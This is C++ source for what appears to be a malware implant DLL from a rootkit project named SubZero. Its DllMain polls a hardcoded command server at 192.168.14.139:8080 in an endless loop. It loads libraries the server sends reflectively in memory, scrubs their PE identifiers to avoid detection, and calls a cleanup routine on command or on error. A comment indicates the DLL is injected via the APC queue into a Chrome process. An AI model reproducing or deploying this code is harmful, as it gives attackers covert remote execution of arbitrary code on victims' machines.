#include "pch.h"
#include "HttpClient.h"
#include "ReflectiveLibraryLoader.h"
#include "../SubZeroUtils/RegistryManager.h"
#include "../SubZeroUtils/ServiceManager.h"
#include "../SubZeroCleanup/SubZeroCleanup.h"

constexpr int SecondsToMilliseconds(int seconds) { return seconds * 1000; }

const std::string IpAddress("192.168.14.139");
constexpr int Port = 8080;
constexpr int SecondsBetweenFetches = 5;

void ResponseHandler(ServerOpcode ServerOC, const PVOID Data, size_t DataLength, std::string* ReturnedData)
{
    PMEMORY_MODULE hModule = nullptr;
	
    switch (ServerOC)
    {
    case ServerOpcode::LoadLibraryReflectively:
        hModule = ReflectiveLibraryLoader::MemoryLoadLibrary(Data, DataLength);
		if (nullptr == hModule)
            throw std::runtime_error("[-] Library module object failed to initialize");
    	
		ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
        break;               
    
    case ServerOpcode::InjectKernelShellcode:
        // TODO
        break;
    	
    case ServerOpcode::Cleanup:
        SubZeroCleanup::Cleanup();
        break;
    	
    default:        
        throw std::runtime_error("[-] Unknown opcode");
    }
}

BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
{
	std::unique_ptr<HttpClient> httpClient(new HttpClient(IpAddress, Port, ResponseHandler));
	
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	    try {
            // Endless loop, preventing from the APC queue to empty and launch a Chrome window
            while (true) {
                if (httplib::Error::Success != httpClient->FetchFromServer()) {

                    // Error connecting to server - Try again in 5 seconds
                    httpClient.release();
                    httpClient.reset(new HttpClient(IpAddress, Port, ResponseHandler));
                }

                ::Sleep(SecondsToMilliseconds(SecondsBetweenFetches));
            }
	    }
	    catch (...) {
	    	// Unknown exception
            SubZeroCleanup::Cleanup();
	    }     

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}